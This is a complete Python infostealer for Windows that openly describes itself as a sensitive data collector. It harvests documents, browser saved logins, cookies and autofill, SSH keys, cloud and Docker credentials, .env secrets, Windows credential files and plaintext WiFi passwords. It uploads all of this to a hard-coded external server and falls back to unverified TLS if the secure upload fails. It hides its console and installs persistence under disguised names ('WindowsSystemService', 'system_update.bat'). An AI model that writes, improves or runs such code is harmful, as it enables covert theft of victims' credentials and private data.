"""
Sensitive Data Scanner and Collector (Windows Target)
- Scans for sensitive user data (not default system files)
- Collects documents, credentials, browser data, etc.
- Sends data to backend server
- Runs in background mode on Windows
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import platform
import threading
import time
import requests
from datetime import datetime
from pathlib import Path
import subprocess
import ctypes
import winreg

# Backend server configuration
# BACKEND_URL = "http://localhost:5000"  # Change to actual server URL

BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app" 
API_ENDPOINT = f"{BACKEND_URL}/api/receive"
BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"

# File extensions considered sensitive
SENSITIVE_EXTENSIONS = {
    # Documents
    '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
    '.txt', '.rtf', '.odt', '.ods', '.odp',
    # Credentials & Keys
    '.pem', '.key', '.crt', '.pfx', '.p12', '.ppk',
    '.kdbx', '.keychain', '.keystore',
    # Configuration with potential secrets
    '.env', '.ini', '.cfg', '.conf',
    # Database files
    '.db', '.sqlite', '.sqlite3', '.sql',
    # Archives (may contain sensitive data)
    '.zip', '.rar', '.7z', '.tar', '.gz',
    # Images (may contain personal photos)
    '.jpg', '.jpeg', '.png', '.gif', '.bmp',
    # Cryptocurrency
    '.wallet', '.dat',
}

# Folders to skip (default system folders - Windows focused)
SKIP_FOLDERS = {
    # Windows system folders
    'Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
    '$Recycle.Bin', 'System Volume Information', 'Recovery',
    'MSOCache', 'PerfLogs', 'Intel', 'AMD', 'NVIDIA',
    'AppData\\Local\\Microsoft', 'AppData\\Local\\Packages',
    # Common non-sensitive folders
    'node_modules', '__pycache__', '.git', '.svn', '.vscode',
    'venv', '.venv', 'env', '.env', 'site-packages',
    'Temp', 'tmp', 'Cache', 'cache', 'Caches',
}

# Sensitive folder names to prioritize (Windows)
SENSITIVE_FOLDERS = {
    'Documents', 'Desktop', 'Downloads', 'Pictures', 'Videos',
    'OneDrive', 'Dropbox', 'Google Drive', 'iCloud Drive',
    'Passwords', 'Keys', 'Certificates', 'Secrets',
    'Wallet', 'Crypto', 'Bitcoin', 'Ethereum',
    '.ssh', '.gnupg', '.aws', '.azure',
}

# Browser paths for Windows
BROWSER_PATHS = {
    'chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
    'chrome_beta': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome Beta\User Data'),
    'firefox': os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles'),
    'edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
    'brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'),
    'opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable'),
    'opera_gx': os.path.expandvars(r'%APPDATA%\Opera Software\Opera GX Stable'),
    'vivaldi': os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data'),
}


class SensitiveDataCollector:
    """Class to scan and collect sensitive user data on Windows"""
    
    def __init__(self, backend_url=BACKEND_URL):
        self.backend_url = backend_url
        self.api_endpoint = f"{backend_url}/api/receive"
        self.batch_endpoint = f"{backend_url}/api/receive/batch"
        self.user_home = Path.home()
        self.collected_data = []
        self.running = False
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')
        
    def get_user_directories(self):
        """Get Windows user directories to scan (skip system directories)"""
        user_dirs = []
        
        # Primary user directories (Windows)
        primary_dirs = [
            self.user_home / 'Documents',
            self.user_home / 'Desktop',
            self.user_home / 'Downloads',
            self.user_home / 'Pictures',
            self.user_home / 'Videos',
            self.user_home / 'Music',
            self.user_home / 'OneDrive',
            self.user_home / 'Dropbox',
            self.user_home / 'Google Drive',
        ]
        
        # AppData sensitive locations
        if self.appdata:
            appdata_dirs = [
                Path(self.appdata) / 'Microsoft' / 'Credentials',
                Path(self.appdata) / 'Microsoft' / 'Protect',
                Path(self.appdata) / 'Microsoft' / 'Vault',
            ]
            primary_dirs.extend(appdata_dirs)
        
        for d in primary_dirs:
            if d.exists():
                user_dirs.append(d)
        
        return user_dirs
    
    def should_skip_folder(self, folder_name):
        """Check if folder should be skipped"""
        return folder_name in SKIP_FOLDERS or folder_name.startswith('.')
    
    def is_sensitive_file(self, file_path):
        """Check if file is potentially sensitive"""
        path = Path(file_path)
        
        # Check extension
        if path.suffix.lower() in SENSITIVE_EXTENSIONS:
            return True
        
        # Check filename patterns
        sensitive_patterns = [
            'password', 'passwd', 'credential', 'secret', 'key',
            'token', 'auth', 'login', 'account', 'wallet',
            'private', 'cert', 'config', 'backup',
            'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
        ]
        
        filename_lower = path.name.lower()
        for pattern in sensitive_patterns:
            if pattern in filename_lower:
                return True
        
        return False
    
    def scan_directory(self, directory, max_depth=5, current_depth=0):
        """Recursively scan directory for sensitive files"""
        sensitive_files = []
        
        if current_depth > max_depth:
            return sensitive_files
        
        try:
            for item in os.scandir(directory):
                try:
                    if item.is_file():
                        if self.is_sensitive_file(item.path):
                            file_info = self.get_file_info(item.path)
                            if file_info:
                                sensitive_files.append(file_info)
                    elif item.is_dir():
                        # Skip system and non-sensitive folders
                        if not self.should_skip_folder(item.name):
                            sensitive_files.extend(
                                self.scan_directory(item.path, max_depth, current_depth + 1)
                            )
                except PermissionError:
                    continue
                except Exception:
                    continue
        except PermissionError:
            pass
        except Exception:
            pass
        
        return sensitive_files
    
    def get_file_info(self, file_path, include_content=True, max_size_kb=500):
        """Get file information and optionally content"""
        try:
            path = Path(file_path)
            stat = path.stat()
            
            file_info = {
                'path': str(file_path),
                'name': path.name,
                'extension': path.suffix,
                'size_bytes': stat.st_size,
                'modified_time': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                'created_time': datetime.fromtimestamp(stat.st_ctime).isoformat(),
            }
            
            # Include content for small text-based files
            if include_content and stat.st_size <= max_size_kb * 1024:
                text_extensions = {'.txt', '.env', '.ini', '.cfg', '.conf', '.json', '.xml', '.yaml', '.yml', '.pem', '.key'}
                if path.suffix.lower() in text_extensions:
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            file_info['content'] = content
                    except:
                        pass
                else:
                    # For binary files, encode as base64 if small enough
                    if stat.st_size <= 100 * 1024:  # 100KB limit for binary
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read()
                                file_info['content_base64'] = base64.b64encode(content).decode('utf-8')
                        except:
                            pass
            
            return file_info
        except Exception:
            return None
    
    def collect_browser_data(self):
        """Collect browser cookies, history, and saved passwords info (Windows)"""
        browser_data = []
        
        for browser_name, browser_path in BROWSER_PATHS.items():
            if os.path.exists(browser_path):
                browser_info = {
                    'browser': browser_name,
                    'path': browser_path,
                    'data_found': []
                }
                
                # Look for sensitive browser files
                sensitive_browser_files = [
                    'Login Data', 'Login Data For Account',
                    'Cookies', 'Network\\Cookies',
                    'History', 'Web Data',
                    'Bookmarks', 'Preferences', 'Local State',
                    'logins.json', 'cookies.sqlite', 'places.sqlite',
                    'key3.db', 'key4.db', 'cert9.db', 'signons.sqlite',
                ]
                
                try:
                    for root, dirs, files in os.walk(browser_path):
                        for file in files:
                            if file in sensitive_browser_files:
                                file_path = os.path.join(root, file)
                                try:
                                    # Try to copy the file to read it (browsers lock files)
                                    temp_path = os.path.join(os.getenv('TEMP'), f'temp_{file}')
                                    shutil.copy2(file_path, temp_path)
                                    
                                    file_info = {
                                        'file': file,
                                        'path': file_path,
                                        'size': os.path.getsize(file_path)
                                    }
                                    
                                    # For SQLite databases, try to extract data
                                    if file in ['Login Data', 'Login Data For Account', 'Web Data', 'Cookies']:
                                        extracted = self.extract_chromium_data(temp_path, file)
                                        if extracted:
                                            file_info['extracted_data'] = extracted
                                    
                                    browser_info['data_found'].append(file_info)
                                    
                                    # Clean up temp file
                                    try:
                                        os.remove(temp_path)
                                    except:
                                        pass
                                        
                                except Exception as e:
                                    browser_info['data_found'].append({
                                        'file': file,
                                        'path': file_path,
                                        'error': str(e)
                                    })
                        
                        # Limit depth
                        if root.count(os.sep) - browser_path.count(os.sep) > 3:
                            break
                except Exception:
                    pass
                
                if browser_info['data_found']:
                    browser_data.append(browser_info)
        
        return browser_data
    
    def extract_chromium_data(self, db_path, file_type):
        """Extract data from Chromium-based browser SQLite databases"""
        extracted = []
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            if file_type in ['Login Data', 'Login Data For Account']:
                # Get saved login URLs and usernames (passwords are encrypted)
                cursor.execute("SELECT origin_url, username_value, date_created FROM logins")
                for row in cursor.fetchall():
                    extracted.append({
                        'url': row[0],
                        'username': row[1],
                        'created': row[2]
                    })
            
            elif file_type == 'Cookies':
                # Get cookies
                cursor.execute("SELECT host_key, name, path, expires_utc FROM cookies LIMIT 100")
                for row in cursor.fetchall():
                    extracted.append({
                        'host': row[0],
                        'name': row[1],
                        'path': row[2],
                        'expires': row[3]
                    })
            
            elif file_type == 'Web Data':
                # Get autofill data
                try:
                    cursor.execute("SELECT name, value FROM autofill LIMIT 100")
                    for row in cursor.fetchall():
                        extracted.append({
                            'field': row[0],
                            'value': row[1]
                        })
                except:
                    pass
                
                # Get credit cards (numbers are encrypted)
                try:
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year FROM credit_cards")
                    for row in cursor.fetchall():
                        extracted.append({
                            'card_name': row[0],
                            'exp_month': row[1],
                            'exp_year': row[2]
                        })
                except:
                    pass
            
            conn.close()
        except Exception:
            pass
        
        return extracted
    
    def collect_ssh_keys(self):
        """Collect SSH key information (Windows)"""
        ssh_data = []
        
        # Windows SSH locations
        ssh_locations = [
            self.user_home / '.ssh',
            Path(os.getenv('USERPROFILE', '')) / '.ssh',
        ]
        
        for ssh_dir in ssh_locations:
            if ssh_dir.exists():
                try:
                    for item in os.scandir(ssh_dir):
                        if item.is_file():
                            file_info = self.get_file_info(item.path, include_content=True)
                            if file_info:
                                ssh_data.append(file_info)
                except PermissionError:
                    pass
        
        return ssh_data
    
    def collect_cloud_credentials(self):
        """Collect cloud service credentials (AWS, Azure, GCP) on Windows"""
        cloud_data = []
        
        cloud_paths = [
            # AWS
            self.user_home / '.aws' / 'credentials',
            self.user_home / '.aws' / 'config',
            # Azure
            self.user_home / '.azure' / 'credentials',
            self.user_home / '.azure' / 'accessTokens.json',
            self.user_home / '.azure' / 'azureProfile.json',
            # GCP
            Path(self.appdata) / 'gcloud' / 'credentials.db' if self.appdata else None,
            Path(self.appdata) / 'gcloud' / 'application_default_credentials.json' if self.appdata else None,
            # Docker
            self.user_home / '.docker' / 'config.json',
            # Kubernetes
            self.user_home / '.kube' / 'config',
        ]
        
        for path in cloud_paths:
            if path and path.exists():
                file_info = self.get_file_info(str(path), include_content=True)
                if file_info:
                    cloud_data.append(file_info)
        
        return cloud_data
    
    def collect_windows_credentials(self):
        """Collect Windows-specific credential information"""
        cred_data = []
        
        # Windows Credential Manager paths
        credential_paths = [
            Path(self.appdata) / 'Microsoft' / 'Credentials' if self.appdata else None,
            Path(self.localappdata) / 'Microsoft' / 'Credentials' if self.localappdata else None,
            Path(self.appdata) / 'Microsoft' / 'Protect' if self.appdata else None,
            Path(self.appdata) / 'Microsoft' / 'Vault' if self.appdata else None,
        ]
        
        for cred_path in credential_paths:
            if cred_path and cred_path.exists():
                try:
                    for item in os.scandir(cred_path):
                        if item.is_file():
                            cred_data.append({
                                'path': item.path,
                                'name': item.name,
                                'size': item.stat().st_size,
                                'modified': datetime.fromtimestamp(item.stat().st_mtime).isoformat()
                            })
                        elif item.is_dir():
                            for sub_item in os.scandir(item.path):
                                if sub_item.is_file():
                                    cred_data.append({
                                        'path': sub_item.path,
                                        'name': sub_item.name,
                                        'size': sub_item.stat().st_size,
                                        'modified': datetime.fromtimestamp(sub_item.stat().st_mtime).isoformat()
                                    })
                except PermissionError:
                    pass
        
        return cred_data
    
    def collect_wifi_passwords(self):
        """Collect saved WiFi passwords on Windows"""
        wifi_data = []
        
        try:
            # Get list of WiFi profiles
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            profiles = []
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line or 'Current User Profile' in line:
                    profile_name = line.split(':')[1].strip()
                    if profile_name:
                        profiles.append(profile_name)
            
            # Get password for each profile
            for profile in profiles:
                try:
                    result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    
                    wifi_info = {'ssid': profile, 'password': None}
                    
                    for line in result.stdout.split('\n'):
                        if 'Key Content' in line:
                            wifi_info['password'] = line.split(':')[1].strip()
                            break
                    
                    wifi_data.append(wifi_info)
                except:
                    pass
                    
        except Exception:
            pass
        
        return wifi_data
    
    def collect_registry_data(self):
        """Collect sensitive data from Windows Registry"""
        registry_data = []
        
        # Registry paths that may contain sensitive data
        registry_keys = [
            (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'),
            (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths'),
            (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Internet Explorer\TypedURLs'),
            (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run'),
        ]
        
        for hive, key_path in registry_keys:
            try:
                key = winreg.OpenKey(hive, key_path)
                key_data = {'path': key_path, 'values': []}
                
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        key_data['values'].append({'name': name, 'value': str(value)})
                        i += 1
                    except WindowsError:
                        break
                
                winreg.CloseKey(key)
                
                if key_data['values']:
                    registry_data.append(key_data)
                    
            except Exception:
                pass
        
        return registry_data
    
    def collect_env_files(self):
        """Collect .env files which often contain secrets"""
        env_files = []
        
        # Search in common development directories
        search_dirs = [
            self.user_home / 'Documents',
            self.user_home / 'Projects',
            self.user_home / 'Development',
            self.user_home / 'dev',
            self.user_home / 'code',
            self.user_home / 'workspace',
        ]
        
        for search_dir in search_dirs:
            if search_dir.exists():
                for root, dirs, files in os.walk(search_dir):
                    # Skip deep directories
                    if root.count(os.sep) - str(search_dir).count(os.sep) > 4:
                        dirs.clear()
                        continue
                    
                    # Skip node_modules and similar
                    dirs[:] = [d for d in dirs if d not in SKIP_FOLDERS]
                    
                    for file in files:
                        if file == '.env' or file.endswith('.env') or file.startswith('.env'):
                            file_path = os.path.join(root, file)
                            file_info = self.get_file_info(file_path, include_content=True)
                            if file_info:
                                env_files.append(file_info)
        
        return env_files
    
    def collect_recent_files(self):
        """Collect information about recently modified sensitive files"""
        recent_files = []
        
        # Get files modified in last 30 days
        cutoff_time = time.time() - (30 * 24 * 60 * 60)
        
        user_dirs = self.get_user_directories()
        
        for user_dir in user_dirs:
            try:
                for root, dirs, files in os.walk(user_dir):
                    # Skip deep directories
                    if root.count(os.sep) - str(user_dir).count(os.sep) > 3:
                        dirs.clear()
                        continue
                    
                    # Skip system folders
                    dirs[:] = [d for d in dirs if d not in SKIP_FOLDERS]
                    
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            stat = os.stat(file_path)
                            if stat.st_mtime > cutoff_time and self.is_sensitive_file(file_path):
                                file_info = self.get_file_info(file_path, include_content=False)
                                if file_info:
                                    recent_files.append(file_info)
                        except:
                            continue
            except:
                continue
        
        return recent_files[:100]  # Limit to 100 most recent
    
    def collect_all_sensitive_data(self):
        """Main method to collect all sensitive data on Windows"""
        all_data = {
            'timestamp': datetime.now().isoformat(),
            'hostname': platform.node(),
            'os': 'Windows',
            'os_version': platform.version(),
            'username': os.getenv('USERNAME'),
            'computer_name': os.getenv('COMPUTERNAME'),
            'user_domain': os.getenv('USERDOMAIN'),
            'home_directory': str(self.user_home),
            'data_collected': {}
        }
        
        # Collect different types of sensitive data
        print("[*] Scanning for sensitive files...")
        user_dirs = self.get_user_directories()
        all_sensitive_files = []
        for user_dir in user_dirs:
            all_sensitive_files.extend(self.scan_directory(user_dir, max_depth=4))
        all_data['data_collected']['sensitive_files'] = all_sensitive_files[:200]  # Limit
        
        print("[*] Collecting browser data...")
        all_data['data_collected']['browser_data'] = self.collect_browser_data()
        
        print("[*] Collecting SSH keys...")
        all_data['data_collected']['ssh_keys'] = self.collect_ssh_keys()
        
        print("[*] Collecting cloud credentials...")
        all_data['data_collected']['cloud_credentials'] = self.collect_cloud_credentials()
        
        print("[*] Collecting .env files...")
        all_data['data_collected']['env_files'] = self.collect_env_files()
        
        print("[*] Collecting recent files...")
        all_data['data_collected']['recent_files'] = self.collect_recent_files()
        
        print("[*] Collecting Windows credentials...")
        all_data['data_collected']['windows_credentials'] = self.collect_windows_credentials()
        
        print("[*] Collecting WiFi passwords...")
        all_data['data_collected']['wifi_passwords'] = self.collect_wifi_passwords()
        
        print("[*] Collecting Registry data...")
        all_data['data_collected']['registry_data'] = self.collect_registry_data()
        
        return all_data
    
    def send_data_to_backend(self, data, data_type='sensitive_data'):
        """Send collected data to backend server"""
        try:
            # Clean the data to ensure it's JSON serializable
            cleaned_data = self._make_json_serializable(data)
            
            headers = {'Content-Type': 'application/json'}
            url = f"{self.api_endpoint}?type={data_type}"
            print(f"[*] Sending to: {url}")
            
            # Convert to JSON string first to verify it's valid
            json_str = json.dumps(cleaned_data)
            print(f"[*] Data size: {len(json_str)} bytes")
            
            response = requests.post(
                url,
                data=json_str,  # Send as string instead of json parameter
                headers=headers,
                timeout=30,
                verify=True
            )
            
            print(f"[*] Response status: {response.status_code}")
            if response.text:
                print(f"[*] Response body: {response.text[:300]}")
            
            if response.status_code in [200, 201]:
                print(f"[+] Data sent successfully to backend (Status: {response.status_code})")
                return True
            else:
                print(f"[-] Failed to send data: {response.status_code}")
                print(f"    Response: {response.text[:200]}")
                return False
        except requests.exceptions.ConnectionError as e:
            print(f"[-] Cannot connect to backend server at {self.backend_url}")
            print(f"    Error: {str(e)[:100]}")
            return False
        except requests.exceptions.SSLError as e:
            print(f"[-] SSL verification failed: {str(e)[:100]}")
            # Retry without SSL verification
            try:
                print("[*] Retrying without SSL verification...")
                json_str = json.dumps(self._make_json_serializable(data))
                response = requests.post(
                    url,
                    data=json_str,
                    headers=headers,
                    timeout=30,
                    verify=False
                )
                if response.status_code in [200, 201]:
                    print(f"[+] Data sent successfully (without SSL verification)")
                    return True
                else:
                    print(f"[-] Still failed: {response.status_code}")
                    return False
            except Exception as e2:
                print(f"[-] Retry failed: {str(e2)[:100]}")
                return False
        except Exception as e:
            print(f"[-] Error sending data: {str(e)[:200]}")
            return False
    
    def _make_json_serializable(self, obj):
        """Convert non-serializable objects to serializable format"""
        if isinstance(obj, dict):
            return {k: self._make_json_serializable(v) for k, v in obj.items()}
        elif isinstance(obj, (list, tuple)):
            return [self._make_json_serializable(item) for item in obj]
        elif isinstance(obj, Path):
            return str(obj)
        elif isinstance(obj, datetime):
            return obj.isoformat()
        elif isinstance(obj, (int, float, str, bool, type(None))):
            return obj
        else:
            return str(obj)
    
    def run_collection(self):
        """Run the full collection process"""
        print("[*] Starting sensitive data collection...")
        
        # Collect all sensitive data
        collected_data = self.collect_all_sensitive_data()
        
        # Calculate summary
        summary = {
            'total_sensitive_files': len(collected_data['data_collected'].get('sensitive_files', [])),
            'browsers_found': len(collected_data['data_collected'].get('browser_data', [])),
            'ssh_keys_found': len(collected_data['data_collected'].get('ssh_keys', [])),
            'cloud_creds_found': len(collected_data['data_collected'].get('cloud_credentials', [])),
            'env_files_found': len(collected_data['data_collected'].get('env_files', [])),
            'recent_files_found': len(collected_data['data_collected'].get('recent_files', [])),
        }
        collected_data['summary'] = summary
        
        print(f"[*] Collection complete:")
        print(f"    - Sensitive files: {summary['total_sensitive_files']}")
        print(f"    - Browsers: {summary['browsers_found']}")
        print(f"    - SSH keys: {summary['ssh_keys_found']}")
        print(f"    - Cloud credentials: {summary['cloud_creds_found']}")
        print(f"    - .env files: {summary['env_files_found']}")
        print(f"    - Recent files: {summary['recent_files_found']}")
        
        # Send to backend - try single send first
        print("[*] Sending data to backend server...")
        if not self.send_data_to_backend(collected_data):
            # If single send fails, try batch send with chunked data
            print("[*] Attempting to send data in batches...")
            self.send_data_in_batches(collected_data)
        
        return collected_data
    
    def send_data_in_batches(self, collected_data):
        """Send data in smaller chunks if single send fails"""
        data_types = collected_data.get('data_collected', {})
        
        # Send summary and metadata first
        summary_data = {
            'timestamp': collected_data['timestamp'],
            'hostname': collected_data['hostname'],
            'os': collected_data['os'],
            'os_version': collected_data['os_version'],
            'username': collected_data['username'],
            'computer_name': collected_data['computer_name'],
            'user_domain': collected_data['user_domain'],
            'home_directory': collected_data['home_directory'],
            'summary': collected_data.get('summary', {})
        }
        
        print("[*] Sending metadata...")
        self.send_data_to_backend(summary_data, data_type='metadata')
        
        # Send each data type separately
        for data_type, data_list in data_types.items():
            if isinstance(data_list, list) and data_list:
                print(f"[*] Sending {data_type} ({len(data_list)} items)...")
                # Send in chunks of 50 items at a time
                for i in range(0, len(data_list), 50):
                    chunk = data_list[i:i+50]
                    self.send_data_to_backend({
                        'type': data_type,
                        'items': chunk,
                        'chunk': f"{i//50 + 1}"
                    }, data_type=data_type)


def run_in_background():
    """Run the collector in background mode on Windows"""
    # Hide console window
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.FreeConsole()
    except:
        pass
    
    # Run as background process using Windows-specific method
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.Popen(
            [sys.executable, __file__, '--no-daemon'],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        sys.exit(0)
    except Exception:
        # Fallback: just run in current process
        pass


def add_to_startup():
    """Add script to Windows startup for persistence"""
    try:
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )
        
        # Create a batch file or shortcut
        script_path = os.path.abspath(__file__)
        bat_path = os.path.join(startup_path, 'system_update.bat')
        
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\n')
            f.write(f'pythonw "{script_path}" --daemon --continuous\n')
        
        return True
    except Exception:
        return False


def add_to_registry_startup():
    """Add to Windows Registry Run key for persistence"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE
        )
        
        script_path = os.path.abspath(__file__)
        python_exe = sys.executable.replace('python.exe', 'pythonw.exe')
        
        winreg.SetValueEx(
            key, 'WindowsSystemService', 0, winreg.REG_SZ,
            f'"{python_exe}" "{script_path}" --daemon --continuous'
        )
        
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def continuous_monitoring(interval_minutes=30):
    """Run continuous monitoring in background"""
    collector = SensitiveDataCollector()
    
    while True:
        try:
            collector.run_collection()
        except Exception as e:
            pass  # Silent failure in background mode
        
        # Wait for next interval
        time.sleep(interval_minutes * 60)


def main():
    """Main entry point for Windows"""
    global BACKEND_URL, API_ENDPOINT, BATCH_ENDPOINT
    
    import argparse
    
    parser = argparse.ArgumentParser(description='Sensitive Data Collector (Windows)')
    parser.add_argument('--daemon', '-d', action='store_true', 
                       help='Run in background/daemon mode')
    parser.add_argument('--continuous', '-c', action='store_true',
                       help='Run continuous monitoring')
    parser.add_argument('--interval', '-i', type=int, default=30,
                       help='Interval in minutes for continuous monitoring (default: 30)')
    parser.add_argument('--server', '-s', type=str, default=BACKEND_URL,
                       help=f'Backend server URL (default: {BACKEND_URL})')
    parser.add_argument('--persist', '-p', action='store_true',
                       help='Add to Windows startup for persistence')
    parser.add_argument('--no-daemon', action='store_true',
                       help='Internal flag - do not use')
    
    args = parser.parse_args()
    
    # Always update backend URL from args (use default if not specified)
    BACKEND_URL = args.server
    API_ENDPOINT = f"{BACKEND_URL}/api/receive"
    BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"
    
    # Add persistence if requested
    if args.persist:
        if add_to_registry_startup():
            print("[+] Added to Windows startup (Registry)")
        elif add_to_startup():
            print("[+] Added to Windows startup folder")
        else:
            print("[-] Failed to add persistence")
    
    if args.daemon and not args.no_daemon:
        print("[*] Starting in background mode...")
        run_in_background()
        if args.continuous:
            continuous_monitoring(args.interval)
        else:
            collector = SensitiveDataCollector(args.server)
            collector.run_collection()
    elif args.continuous:
        print("[*] Starting continuous monitoring...")
        continuous_monitoring(args.interval)
    else:
        # Run once in foreground
        collector = SensitiveDataCollector(args.server)
        collector.run_collection()


if __name__ == '__main__':
    main()
